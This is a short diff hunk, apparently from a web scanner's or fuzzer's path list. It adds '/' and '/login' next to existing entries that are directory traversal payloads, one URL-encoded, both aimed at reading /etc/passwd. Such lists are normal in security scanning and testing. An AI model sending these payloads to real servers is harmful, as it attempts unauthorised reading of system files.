@@ -22,3 +22,5 @@
 /?q=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
 {{paths}}
 /eam/vib?id=/etc/passwd
+/
+/login
